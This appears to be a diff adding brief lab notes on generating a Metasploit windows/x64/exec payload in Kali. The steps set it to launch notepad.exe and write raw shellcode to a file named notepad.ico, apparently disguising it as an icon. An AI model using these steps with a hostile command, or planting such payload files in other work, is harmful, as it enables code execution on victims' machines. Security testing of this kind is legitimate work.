@@ -1,0 +1,12 @@
+[ metasploit payload/windows/x64/exec ]
+
+https://www.infosecmatter.com/metasploit-module-library/?mm=payload/windows/x64/exec
+
+In kali linux terminal:
+
+1. msfconsole
+2. use payload/windows/x64/exec
+3. show options
+4. set CMD notepad.exe, set EXITFUNC thread
+5. generate -h
+6. generate -f raw -o notepad.ico
